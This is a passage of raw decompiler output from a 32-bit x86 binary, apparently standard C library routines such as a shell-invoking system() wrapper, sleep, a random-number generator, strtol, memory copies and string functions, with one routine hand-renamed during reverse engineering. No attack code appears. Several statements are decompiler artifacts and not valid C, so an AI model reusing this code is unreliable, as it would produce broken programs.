    edx = 1000000 / 1000000 % 1000000 / 1000000;
    Vfffffff8 = eax;
    edx = (eax << 5) - eax;
    eax = ((edx << 6) - edx << 3) + Vfffffff8 << 6;
    Vfffffffc = A8 - eax;
    return(select(1, 0, 0, 0, & Vfffffff8));
}



L080555FC(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    (save)ebx;
    ebx = A8;
    eax = Ac;
    *(ebp + -32768) = eax;
    ecx = & A10;
    edx = 1;
    if(eax != 0) {
        do {
            if(edx > 8191) {
                goto L08055628;
            }
            ecx = ecx + 4;
            *(ebp + edx * 4 + -32768) = *(ecx - 4);
            eax = edx;
            edx = edx + 1;
        } while(*(ebp + eax * 4 + -32768) != 0);
        goto L0805564a;
L08055628:
        eax = 7;
    } else {
L0805564a:
        eax = execve(ebx, ebp + -32768, *L0806D228);
    }
    ebx = *(ebp + -32772);
}



L08055668(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  edi;



    al = 0;
    edi = A8;
    asm("cld");
    ecx = -1;
    asm("repne scasb");
    edi = !ecx - 1;
    ebx = *L0806D228;
    if(*ebx != 0) {
        do {
            if(L08057B04( *ebx, A8, edi) == 0 && *(edi + *ebx) == 61) {
                goto L080556ac;
            }
            ebx = ebx + 4;
        } while(*ebx != 0);
        goto L080556b8;
L080556ac:
        eax = edi + 1 + *ebx;
    } else {
L080556b8:
        eax = 0;
    }
}




L080556CC(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;



    Vffffffd0 = *L08078B14;
    if(A8 == 0) {
        eax = 0;
    } else {
        Vffffffdc = 8192;
        if(sigprocmask(SIG_BLOCK, & Vffffffdc, & Vffffffd8) >= 0) {
            Vfffffff0 = 0x80556c4;
            Vfffffff4 = 0;
            Vfffffff8 = 0;
            if(sigaction(SIGALRM, & Vfffffff0, & Vffffffe0) >= 0) {
                goto L0805573c;
            }
        }
        eax = A8;
        goto L080557dd;
L0805573c:
        Vffffffd4 = time(0);
        ebx = alarm(A8);
        esp = esp + 8;
        if(ebx != 0 && ebx < A8) {
            sigaction(SIGALRM, & Vffffffe0, 0);
            alarm(ebx);
            sigsuspend(& Vffffffd8);
            esi = time(0);
            esp = esp + 24;
        } else {
            sigsuspend(& Vffffffd8);
            esi = time(0);
            sigaction(SIGALRM, & Vffffffe0, 0);
            esp = esp + 20;
        }
        eax = esi - Vffffffd4;
        esi = 0;
        if(eax <= A8) {
            esi = A8 - eax;
        }
        edx = 0;
        if(eax <= ebx) {
            edx = ebx - eax;
        }
        alarm();
        sigprocmask(SIG_SETMASK, & Vffffffd8, 0, edx);
        *L08078B14 = Vffffffd0;
        eax = esi;
    }
L080557dd:
    esp = ebp - 60;
}



L080557E8(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffb4;
	/* unknown */ void  Vffffffb8;
	/* unknown */ void  Vffffffbc;
	/* unknown */ void  Vffffffc0;
	/* unknown */ void  Vffffffc4;
	/* unknown */ void  Vffffffc8;
	/* unknown */ void  Vffffffcc;
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;



    if(A8 == 0) {
        eax = 1;
    } else {
        Vfffffff0 = 1;
        Vfffffff8 = 0;
        Vfffffff4 = 0;
        if(sigaction(SIGINT, & Vfffffff0, & Vffffffe0) >= 0) {
            if(sigaction(SIGQUIT, & Vfffffff0, & Vffffffd0) < 0) {
                ebx = *L08078B14;
                (save)0;
                (save) & Vffffffe0;
                (save)2;
            } else {
                Vffffffcc = 65536;
                ebx = *L08078B14;
                if(sigprocmask(SIG_BLOCK, & Vffffffcc, & Vffffffc8) >= 0) {
                    goto L080558ba;
                }
                if(*L08078B14 == 38) {
                    goto L080558b4;
                }
                ebx = *L08078B14;
                sigaction(SIGINT, & Vffffffe0, 0);
                (save)0;
                (save) & Vffffffd0;
                (save)3;
            }
            sigaction();
            *L08078B14 = ebx;
        }
L080558aa:
        eax = -1;
        goto L08055993;
L080558b4:
        *L08078B14 = ebx;
L080558ba:
        ebx = fork();
        if(ebx == 0) {
            Vffffffb8 = "sh";
            Vffffffbc = "-c";
            Vffffffc0 = esi;
            Vffffffc4 = 0;
            sigaction();
            sigaction();
            sigprocmask(SIG_SETMASK, & Vffffffc8, 0, 3, & Vffffffd0, 0, 2, & Vffffffe0, 0);
            execve("/bin/sh", & Vffffffb8, *L0806D228);
            exit(127);
        }
        if(ebx < 0 || wait4(ebx, & Vffffffb4, 0) != ebx) {
            Vffffffb4 = -1;
        }
        ebx = *L08078B14;
        edi = sigaction(SIGINT, & Vffffffe0, 0);
        esi = sigaction(SIGQUIT, & Vffffffd0, 0);
        if(!(eax = edi | esi | sigprocmask(SIG_SETMASK, & Vffffffc8, 0))) {
            if(*L08078B14 != 38) {
                goto L080558aa;
            }
            *L08078B14 = ebx;
        }
        eax = Vffffffb4;
    }
L08055993:
    esp = ebp - 88;
}



L080559A0(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    eax = *L08078958;
    *eax = A8;
    if(*L0807895C != 0) {
        esi = 1;
        if(*L08078960 > 1) {
            edi = *L08078958;
            eax = *L08078960 - 1 & 3;
            if(*L08078960 > 1) {
                if(eax == 0) {
                    goto L08055a9c;
                }
                if(eax > 1) {
                    if(eax > 2) {
                        ecx = *edi;
                        edx = (ecx + ecx * 2 << 8) + ecx + ((ecx + ecx * 2 << 8) + ecx) * 4;
                        edx = ecx + (edx + (edx << 10)) * 2;
                        *(edi + 4) = ecx + (edx * 8 - edx) * 4 + (ecx + (edx * 8 - edx) * 4) * 4 + 12345;
                        esi = 2;
                    }
                    ecx = *(edi + esi * 4 - 4);
                    edx = (ecx + ecx * 2 << 8) + ecx + ((ecx + ecx * 2 << 8) + ecx) * 4;
                    edx = ecx + (edx + (edx << 10)) * 2;
                    *(edi + esi * 4) = ecx + (edx * 8 - edx) * 4 + (ecx + (edx * 8 - edx) * 4) * 4 + 12345;
                    esi = esi + 1;
                }
            }
            ecx = *(edi + esi * 4 - 4);
            edx = (ecx + ecx * 2 << 8) + ecx + ((ecx + ecx * 2 << 8) + ecx) * 4;
            edx = ecx + (edx + (edx << 10)) * 2;
            *(edi + esi * 4) = ecx + (edx * 8 - edx) * 4 + (ecx + (edx * 8 - edx) * 4) * 4 + 12345;
            esi = esi + 1;
            if(*L08078960 > esi) {
L08055a9c:
                do {
                    ecx = *(edi + esi * 4 - 4);
                    edx = (ecx + ecx * 2 << 8) + ecx + ((ecx + ecx * 2 << 8) + ecx) * 4;
                    edx = ecx + (edx + (edx << 10)) * 2;
                    *(edi + esi * 4) = ecx + (edx * 8 - edx) * 4 + (ecx + (edx * 8 - edx) * 4) * 4 + 12345;
                    ebx = esi + 1;
                    ecx = *(edi + ebx * 4 - 4);
                    edx = (ecx + ecx * 2 << 8) + ecx + ((ecx + ecx * 2 << 8) + ecx) * 4;
                    edx = ecx + (edx + (edx << 10)) * 2;
                    *(edi + ebx * 4) = ecx + (edx * 8 - edx) * 4 + (ecx + (edx * 8 - edx) * 4) * 4 + 12345;
                    ebx = esi + 2;
                    ecx = *(edi + ebx * 4 - 4);
                    edx = (ecx + ecx * 2 << 8) + ecx + ((ecx + ecx * 2 << 8) + ecx) * 4;
                    edx = ecx + (edx + (edx << 10)) * 2;
                    *(edi + ebx * 4) = ecx + (edx * 8 - edx) * 4 + (ecx + (edx * 8 - edx) * 4) * 4 + 12345;
                    ebx = esi + 3;
                    ecx = *(edi + ebx * 4 - 4);
                    edx = (ecx + ecx * 2 << 8) + ecx + ((ecx + ecx * 2 << 8) + ecx) * 4;
                    edx = ecx + (edx + (edx << 10)) * 2;
                    *(edi + ebx * 4) = ecx + (edx * 8 - edx) * 4 + (ecx + (edx * 8 - edx) * 4) * 4 + 12345;
                    esi = esi + 4;
                } while(*L08078960 > esi);
            }
        }
        *L08078950 = *L08078964 * 4 + *L08078958;
        *L08078954 = *L08078958;
        for(esi = 0; 1; esi = esi + 1) {
            eax = *L08078960;
            if(esi >= eax + eax * 8 + eax) {
                break;
            }
            L08055E38();
        }
    }
}





L08055E38()
{



    if(*L0807895C == 0) {
        eax = *L08078958;
        1103515245 = *eax * edx;
        *eax = edx + 12345 & 2147483647;
        return(*( *L08078958));
    }
    *( *L08078950) = *( *L08078950) + *( *L08078954);
    edx = *( *L08078950) >> 1;
    *L08078950 = *L08078950 + 4;
    if(*L08078968 <= *L08078950) {
        *L08078950 = *L08078958;
        *L08078954 = *L08078954 + 4;
    } else {
        *L08078954 = *L08078954 + 4;
        if(*L08078968 <= *L08078954) {
            *L08078954 = *L08078958;
        }
    }
    eax = edx;
    esp = ebp;
}


L08055ECC()
{



    (save)ebp;
    ebp = esp;
    esp = esp - 4;
    *(ebp - 4) = 32;
    sigprocmask(SIG_UNBLOCK, ebp - 4, 0);
    L08062188();
    do {
    } while(L0806364C(6) == 0);
    exit(127);
}


L08055F08(A8)
/* unknown */ void  A8;
{



    eax = L08055F34();
    if(eax != 0) {
        *eax = 2;
        *(eax + 4) = A8;
        eax = 0;
    } else {
        eax = -1;
    }
}


L08055F34()
{



    ecx = *L08078AF4;
    do {
        edx = 0;
        if(*(ecx + 4) > 0) {
            eax = 0;
            do {
                if(*(eax + ecx + 8) == 0) {
                    goto L08055f98;
                }
                eax = eax + 12;
                edx = edx + 1;
            } while(*(ecx + 4) != edx);
        }
        if(*(ecx + 4) <= 31) {
            goto L08055fa0;
        }
        ecx = *ecx;
    } while(ecx != 0);
    ecx = L0805BD74(392);
    if(ecx != 0) {
        *ecx = *L08078AF4;
        *L08078AF4 = ecx;
        *(ecx + 4) = 1;
        return(ecx + 8);
L08055f98:
        eax = ecx + eax + 8;
        esp = ebp;
        return;
L08055fa0:
        eax = ecx + ( *(ecx + 4) + *(ecx + 4) * 2) * 4 + 8;
        *(ecx + 4) = *(ecx + 4) + 1;
        esp = ebp;
        return;
    }
    esp = ebp;
    return(0);
}



//L08055FBC()
some_sort_of_cleanup()
{



    (save)ebp;
    ebp = esp;
    (save)edi;
    (save)esi;
    (save)ebx;
    edi = *L08078AF4;
    do {
        ebx = *(edi + 4);
        eax = ebx;
        ebx = ebx - 1;
        if(eax != 0) {
            esi = (ebx + ebx * 2) * 4 + 8;
            do {
                edx = esi + edi;
                eax = *edx;
                if(eax == 1) {
                    *( *(edx + 4))( *(ebp + 8), *(edx + 8));
                } else {
                    < ? L0805600d : ;
                    if(eax == 2) {
                        *( *(edx + 4))();
                    }
                }
                eax = ebx;
                esi = esi + -12;
                ebx = ebx - 1;
            } while(eax != 0);
        }
        edi = *edi;
    } while(edi != 0);
    L08062188();
    exit(*(ebp + 8));
}


L0805602C(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{



    if(Ac == 0 || *Ac == 0) {
        return(0);
    }
    if(A8 != 0) {
        *A8 = *Ac & 255;
    }
    esp = ebp;
    return(1);
}



L08056058()
{



    return(L08055E38());
}


L08056064(A8, Ac, A10, A14)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
/* unknown */ void  A14;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vffffffcc;
	/* unknown */ void  Vffffffd0;
	/* unknown */ void  Vffffffd4;
	/* unknown */ void  Vffffffd8;
	/* unknown */ void  Vffffffdc;
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vffffffe4;
	/* unknown */ void  Vffffffe8;
	/* unknown */ void  Vffffffec;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    ebx = A14;
    if(ebx != 0) {
        eax = *( *L08078890 + 20);
        Vffffffe4 = eax;
        if(*eax != 0 && *eax != 255) {
            edx = *( *L08078890 + 16);
            al = 0;
            edi = edx;
            asm("cld");
            ecx = -1;
            asm("repne scasb");
            (save) !ecx - 1;
            if(L0805602C( & Vfffffffc, edx) <= 0) {
                Vfffffffc = *( *( *L08078890 + 16)) & 255;
            }
            if(Vfffffffc != 0) {
                goto L080560cc;
            }
        }
    }
    Vffffffe4 = 0;
L080560cc:
    if(A10 < 0 || A10 == 1 || A10 > 36) {
        A10 = 10;
    }
    esi = A8;
    Vffffffec = esi;
    eax = *esi & 255;
    ecx = *L08078FA0;
    if(!( *(ecx + eax * 2 + 1) & 32)) {
        do {
            esi = esi + 1;
        } while(*(ecx + ( *esi & 255) * 2 + 1) & 32);
    }
    if(*esi != 0) {
        if(*esi == 45) {
            Vfffffff8 = 1;
            esi = esi + 1;
        } else {
            if(*esi == 43) {
                Vfffffff8 = 0;
                esi = esi + 1;
            } else {
                Vfffffff8 = 0;
            }
        }
        if(A10 == 16 && *esi == 48) {
            edx = *(esi + 1) & 255;
            if(*( *L08078FA8 + edx * 4) == 88) {
                esi = esi + 2;
            }
        }
        if(A10 == 0) {
            if(*esi == 48) {
                edx = *(esi + 1) & 255;
                if(*( *L08078FA8 + edx * 4) == 88) {
                    esi = esi + 2;
                    A10 = 16;
                } else {
                    A10 = 8;
                }
            } else {
                A10 = 10;
            }
        }
        Vffffffec = esi;
        if(ebx != 0) {
            ebx = Vffffffec;
            dl = *ebx;
            Vffffffd4 = dl;
            if(Vffffffd4 != 0) {
                ecx = *L08078FA0;
                Vffffffcc = *L08078FA8;
                do {
                    eax = Vffffffd4 & 255;
                    if(Vfffffffc != eax && !( *(ecx + eax * 2 + 1) & 8) && ( *(ecx + eax * 2 + 1) & 4 || A10 <= *(Vffffffcc + eax * 4) + -55)) {
                        break;
                    }
                    ebx = ebx + 1;
                    dl = *ebx;
                    Vffffffd4 = dl;
                } while(Vffffffd4 != 0);
            }
            if(Vfffffffc == ( *esi & 255)) {
                ebx = esi;
            } else {
                Vffffffe0 = ebx;
                Vffffffdc = Vfffffffc;
                if(Vffffffe4 != 0) {
                    if(ebx > esi) {
                        do {
                            ecx = Vffffffe0 - 1;
                            ebx = Vffffffe4;
                            do {
                                if(Vffffffdc == ( *ecx & 255)) {
                                    break;
                                }
                                ecx = ecx - 1;
                            } while(ecx >= esi);
                            edx = Vffffffe0 - ecx;
                            if(edx != ( *ebx & 255) + 1) {
                                edx = Vffffffe0 - ecx;
                                ebx = *ebx & 255;
                                if(edx <= ebx + 1) {
                                    if(ecx < esi) {
                                        goto L080562ec;
                                    }
                                    Vffffffe0 = ecx;
                                } else {
                                    Vffffffe0 = ebx + ecx + 1;
                                }
                            } else {
                                if(ecx < esi) {
                                    goto L080562ec;
                                }
                                Vffffffd8 = ecx - 1;
L08056248:
                                do {
                                    ebx = ebx + 1;
                                    if(*ebx == 0) {
                                        ebx = ebx - 1;
                                    }
                                    ecx = ecx - 1;
                                    if(*ebx != 255) {
                                        Vffffffcc = ecx;
                                        if(ecx >= esi) {
                                            do {
                                                if(Vffffffdc == ( *ecx & 255)) {
                                                    break;
                                                }
                                                ecx = ecx - 1;
                                            } while(ecx >= esi);
                                            if(ecx >= esi) {
                                                goto L0805629d;
                                            }
                                        }
                                        edx = Vffffffcc - ecx;
                                        if(edx <= ( *ebx & 255)) {
                                            break;
                                        }
                                        if(ecx < esi) {
                                            goto L080562a9;
                                        }
L0805629d:
                                        edx = Vffffffcc - ecx;
                                        if(edx == ( *ebx & 255)) {
                                            goto L08056248;
                                        } else {
                                            goto L080562a9;
                                        }
                                    }
                                    if(ecx < esi) {
                                        break;
                                    }
                                    do {
                                        if(Vffffffdc == ( *ecx & 255)) {
                                            break;
                                        }
                                        ecx = ecx - 1;
                                    } while(ecx >= esi);
                                } while(ecx >= esi);
                                goto L080562ec;
L080562a9:
                                Vffffffe0 = Vffffffd8;
                            }
                        } while(Vffffffe0 > esi);
                    }
                    eax = esi;
                    if(Vffffffe0 > esi) {
                        eax = Vffffffe0;
                    }
                    ebx = eax;
                    goto L080562f6;
L080562ec:
                    ebx = Vffffffe0;
                }
            }
        } else {
            ebx = 0;
        }
L080562f6:
        edx = 0;
        A10 = A10 / A10;
        Vfffffff0 = A10 % A10;
        Vfffffff4 = -1;
        Vffffffe8 = 0;
        ecx = 0;
        dl = *esi;
        Vffffffd4 = dl;
        if(Vffffffd4 != 0) {
            Vffffffcc = *L08078FA0;
            do {
                if(esi == ebx) {
                    break;
                }
                if(*(Vffffffcc + (Vffffffd4 & 255) * 2 + 1) & 8) {
                    edi = Vffffffd4 & 255;
                    Vffffffd0 = edi;
                    if(*(Vffffffcc + edi * 2 + 1) & 4) {
                        break;
                    }
                    Vffffffd4 = *( *L08078FA8 + edi * 4) + 201;
                } else {
                    Vffffffd4 = Vffffffd4 + 208;
                }
                eax = Vffffffd4 & 255;
                if(A10 <= eax) {
                    break;
                }
                if(Vfffffff4 >= ecx) {
                    != ? 0x8056378 : ;
                    if(Vfffffff0 < eax) {
                        goto L0805636f;
                    }
                    A10 = A10 * ecx;
                    ecx = ecx + (Vffffffd4 & 255);
                } else {
L0805636f:
                    Vffffffe8 = 1;
                }
                esi = esi + 1;
                dl = *esi;
                Vffffffd4 = dl;
            } while(Vffffffd4 != 0);
        }
        if(Vffffffec == esi) {
            goto L080563ec;
        }
        if(Ac != 0) {
            *Ac = esi;
        }
        if(Vfffffff8 != 0) {
            if(ecx > -2147483648) {
                goto L080563b4;
            }
        } else {
            if(ecx > 2147483647) {
L080563b4:
                Vffffffe8 = 1;
            }
        }
        if(Vffffffe8 == 0) {
            goto L080563e0;
        }
        *L08078B14 = 34;
        eax = 2147483647;
        if(Vfffffff8 != 0) {
            eax = -2147483648;
            goto L0805642a;
L080563e0:
            eax = ecx;
            if(Vfffffff8 != 0) {
                eax = ~eax;
            }
        }
    } else {
L080563ec:
        if(Ac != 0) {
            if(Vffffffec - A8 > 1) {
                if(*( *L08078FA4 + ( *(Vffffffec - 1) & 255) * 4) != 120) {
                    goto L08056420;
                }
                edi = Vffffffec;
                if(*(edi - 2) != 48) {
                    goto L08056420;
                }
                edi = edi - 1;
                *Ac = edi;
            } else {
L08056420:
                *Ac = A8;
            }
        }
        eax = 0;
    }
L0805642a:
    esp = ebp - 64;
}




L08056450(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{



    edx = A10;
    if(edx > 0) {
        eax = 0;
        ecx = edx;
        asm("cld");
        asm("repe cmpsb");
        == ? L0805646f : ;
        asm("sbb eax,eax");
        al = al | 1;
        edx = eax;
    } else {
        eax = 0;
    }
}



L08056480(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    edx = A10;
    edi = Ac;
    esi = A8;
    if(edx > 0) {
        eax = edi - esi;
        if(eax >= edx) {
            if(edx > 7) {
                eax = ~edi & 3;
                edx = edx - eax;
                ecx = eax;
                asm("cld");
                asm("rep movsb");
                eax = edx;
                if(edx < 0) {
                    eax = edx + 3;
                }
                ecx = eax >> 2;
                asm("cld");
                asm("rep movsd");
                eax = edx;
                if(edx < 0) {
                    eax = edx + 3;
                }
                al = al & 252;
                edx = edx - eax;
            }
            ecx = edx;
            asm("cld");
            asm("rep movsb");
        } else {
            esi = esi + edx;
            edi = edi + edx;
            if(edx > 7) {
                eax = edi & 3;
                edx = edx - eax;
                edi = edi - 1;
                esi = esi - 1;
                ecx = eax;
                asm("std");
                asm("rep movsb");
                asm("cld");
                edi = edi + -3;
                esi = esi + -3;
                eax = edx;
                if(edx < 0) {
                    eax = edx + 3;
                }
                ecx = eax >> 2;
                asm("std");
                asm("rep movsd");
                asm("cld");
                edi = edi + 4;
                esi = esi + 4;
                eax = edx;
                if(edx < 0) {
                    eax = edx + 3;
                }
                al = al & 252;
                edx = edx - eax;
            }
            edi = edi - 1;
            esi = esi - 1;
            ecx = edx;
            asm("std");
            asm("rep movsb");
            asm("cld");
        }
    }
}


L0805652C(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  edi;



    edx = A10;
    edi = A8;
    if(edx > 7) {
        eax = ~A8 & 3;
        edx = edx - eax;
        ecx = eax;
        asm("cld");
        asm("rep movsb");
        ecx = edx >> 2;
        asm("cld");
        asm("rep movsd");
        edx = edx & 3;
    }
    ecx = edx;
    asm("cld");
    asm("rep movsb");
    return(A8);
}



L08056570(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    edx = A10;
    edi = A8;
    esi = Ac;
    if(A8 - esi >= edx) {
        if(edx > 7) {
            eax = ~A8 & 3;
            edx = edx - eax;
            ecx = eax;
            asm("cld");
            asm("rep movsb");
            ecx = edx >> 2;
            asm("cld");
            asm("rep movsd");
            edx = edx & 3;
        }
        ecx = edx;
        asm("cld");
        asm("rep movsb");
    } else {
        esi = esi + edx;
        edi = edi + edx;
        if(edx > 7) {
            eax = edi & 3;
            edx = edx - eax;
            edi = edi - 1;
            esi = esi - 1;
            ecx = eax;
            asm("std");
            asm("rep movsb");
            asm("cld");
            edi = edi + -3;
            esi = esi + -3;
            ecx = edx >> 2;
            asm("std");
            asm("rep movsd");
            asm("cld");
            edi = edi + 4;
            esi = esi + 4;
            edx = edx & 3;
        }
        edi = edi - 1;
        esi = esi - 1;
        ecx = edx;
        asm("std");
        asm("rep movsb");
        asm("cld");
    }
    return(A8);
}



L080565F8(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;



    esi = A8;
    ebx = Ac;
    if(esi == ebx) {
        eax = 0;
    } else {
        eax = *esi & 255;
        for(edi = *L08078FA4; 1; eax = *esi & 255) {
            cl = *(edi + eax * 4);
            edx = cl & 255;
            eax = edx - *(edi + ( *ebx & 255) * 4);
            if(eax != 0 || cl == 0) {
                break;
            }
            esi = esi + 1;
            ebx = ebx + 1;
        }
    }
}



L08056640(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;



    ecx = A8 - Ac - 1;
    do {
        al = *edx;
        edx = edx + 1;
        *(ecx + edx) = al;
    } while(al != 0);
    return(ebx);
}



L08056664(A8)
/* unknown */ void  A8;
{
	/* unknown */ void  ebx;
	/* unknown */ void  edi;



    al = 0;
    edi = A8;
    asm("cld");
    ecx = -1;
    asm("repne scasb");
    ebx = !ecx;
    edi = L0805BD74(ebx);
    if(edi != 0) {
        L0805652C(edi, A8, ebx);
        eax = edi;
    } else {
        eax = 0;
    }
}


L080566A4(A8)
/* unknown */ void  A8;
{



    return(L08056E14(A8, 0x807ac6c));
}



L080566BC(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;
	/* unknown */ void  Vfffffffc;



    ecx = A10;
    esi = A8;
    ebx = Ac;
    if(esi != ebx) {
        ecx = ecx - 1;
        if(ecx != -1) {
            edi = *L08078FA4;
            eax = !ecx & 3;
            if(ecx <= -1) {
                goto L08056756;
            }
            if(eax == 0) {
                goto L08056784;
            }
            if(eax >= 3) {
                goto L08056756;
            }
            if(eax >= 2) {
                goto L0805672d;
            }
            al = *(edi + ( *esi & 255) * 4);
            Vfffffffc = al;
            eax = (Vfffffffc & 255) - *(edi + ( *ebx & 255) * 4);
            if(eax != 0) {
                goto L08056800;
            }
            if(Vfffffffc != 0) {
                esi = esi + 1;
                ebx = ebx + 1;
                ecx = ecx - 1;
L0805672d:
                al = *(edi + ( *esi & 255) * 4);
                Vfffffff8 = al;
                eax = (Vfffffff8 & 255) - *(edi + ( *ebx & 255) * 4);
                if(eax != 0) {
                    goto L08056800;
                }
                if(Vfffffff8 != 0) {
                    esi = esi + 1;
                    ebx = ebx + 1;
                    ecx = ecx - 1;
L08056756:
                    al = *(edi + ( *esi & 255) * 4);
                    Vfffffff4 = al;
                    eax = (Vfffffff4 & 255) - *(edi + ( *ebx & 255) * 4);
                    if(eax != 0) {
                        goto L08056800;
                    }
                    if(Vfffffff4 != 0) {
                        esi = esi + 1;
                        ebx = ebx + 1;
                        if(ecx - 1 != -1) {
L08056784:
                            Vfffffff0 = ecx;
                            do {
                                cl = *(edi + ( *esi & 255) * 4);
                                edx = cl & 255;
                                eax = edx - *(edi + ( *ebx & 255) * 4);
                                if(eax != 0) {
                                    goto L08056800;
                                }
                                if(cl == 0) {
                                    goto L080567fe;
                                }
                                esi = esi + 1;
                                ebx = ebx + 1;
                                cl = *(edi + ( *esi & 255) * 4);
                                edx = cl & 255;
                                eax = edx - *(edi + ( *ebx & 255) * 4);
                                if(eax != 0) {
                                    goto L08056800;
                                }
                                if(cl == 0) {
                                    goto L080567fe;
                                }
                                esi = esi + 1;
                                ebx = ebx + 1;
                                cl = *(edi + ( *esi & 255) * 4);
                                edx = cl & 255;
                                eax = edx - *(edi + ( *ebx & 255) * 4);
                                if(eax != 0) {
                                    goto L08056800;
                                }
                                if(cl == 0) {
                                    goto L080567fe;
                                }
                                esi = esi + 1;
                                ebx = ebx + 1;
                                cl = *(edi + ( *esi & 255) * 4);
                                edx = cl & 255;
                                eax = edx - *(edi + ( *ebx & 255) * 4);
                                if(eax != 0) {
                                    goto L08056800;
                                }
                                if(cl == 0) {
                                    goto L080567fe;
                                }
                                esi = esi + 1;
                                ebx = ebx + 1;
                                Vfffffff0 = Vfffffff0 + -4;
                            } while(Vfffffff0 != -1);
                        }
                    }
                }
            }
        }
    }
L080567fe:
    eax = 0;
L08056800:
    esp = ebp - 28;
}



L0805680C(A8, Ac, A10)
/* unknown */ void  A8;
/* unknown */ void  Ac;
/* unknown */ void  A10;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;



    ecx = Ac;
    ebx = A10;
    edx = A8 - 1;
    if(ebx > 3) {
        esi = ebx >> 2;
        al = *ecx;
        ecx = ecx + 1;
        edx = A8;
        *A8 = al;
        do {
            al = *ecx;
            ecx = ecx + 1;
            edx = edx + 1;
            *edx = al;
            if(al == 0) {
                break;
            }
            al = *ecx;
            ecx = ecx + 1;
            edx = edx + 1;
            *edx = al;
            if(al == 0) {
                break;
            }
            al = *ecx;
            ecx = ecx + 1;
            edx = edx + 1;
            *edx = al;
            if(al == 0) {
                break;
            }
            if(esi = esi - 1) {
                goto L0805686c;
            }
            al = *ecx;
            ecx = ecx + 1;
            edx = edx + 1;
            *edx = al;
        } while(al != 0);
        if(ebx = ebx - edx - A8 - 1) {
            goto L08056881;
        }
    } else {
L0805686c:
        if(!(ebx = ebx & 3)) {
            do {
                al = *ecx;
                ecx = ecx + 1;
                edx = edx + 1;
                *edx = al;
                if(ebx = ebx - 1) {
                    goto L080568c3;
                }
            } while(al != 0);
L08056881:
            eax = ~ebx & 3;
            if(ebx > 0) {
                if(eax == 0) {
                    goto L080568ac;
                }
                if(eax < 3) {
                    if(eax < 2) {
                        edx = edx + 1;
                        *edx = 0;
                        ebx = ebx - 1;
                    }
                    edx = edx + 1;
                    *edx = 0;
                    ebx = ebx - 1;
                }
            }
            edx = edx + 1;
            *edx = 0;
            if(!(ebx = ebx - 1)) {
L080568ac:
                do {
                    *(edx + 1) = 0;
                    *(edx + 2) = 0;
                    *(edx + 3) = 0;
                    edx = edx + 4;
                    *edx = 0;
                } while(ebx = ebx + -4);
            }
        }
    }
L080568c3:
    return(A8);
}



L080568D0(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  ebx;
	/* unknown */ void  esi;



    ebx = A8;
    if(ebx == 0) {
        if(*L08078AFC == 0) {
            *L08078B14 = 22;
            eax = 0;
            goto L08056948;
        }
        ebx = *L08078AFC;
    }
    ebx = ebx + L08057DB0(ebx, Ac);
    if(*ebx == 0) {
        *L08078AFC = 0;
        eax = 0;
    } else {
        esi = ebx;
        ebx = L08057B30(esi, Ac);
        if(ebx == 0) {
            *L08078AFC = 0;
        } else {
            *ebx = 0;
            *L08078AFC = ebx + 1;
        }
        eax = esi;
    }
L08056948:
}



L08056954(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  edi;
	/* unknown */ void  Vfffffe78;
	/* unknown */ void  Vfffffeb9;



    if(A8 != 0) {
        if(uname( & Vfffffe78) == -1) {
            goto L080569aa;
        }
        edx = & Vfffffeb9;
        al = 0;
        edi = edx;
        asm("cld");
        ecx = -1;
        asm("repne scasb");
        if(Ac < !ecx) {
            goto L080569a0;
        }
        (save)edx;
        L08056640(A8);
        eax = 0;
    } else {
L080569a0:
        *L08078B14 = 22;
L080569aa:
        eax = -1;
    }
    esp = ebp + -400;
}



L080569BC(A8, Ac)
/* unknown */ void  A8;
/* unknown */ void  Ac;
{
	/* unknown */ void  Vffffffe0;
	/* unknown */ void  Vfffffff0;
	/* unknown */ void  Vfffffff4;
	/* unknown */ void  Vfffffff8;



    Vfffffff0 = Ac;
    Vfffffff4 = 0;
    Vfffffff8 = -536870912;
    edx = -1;
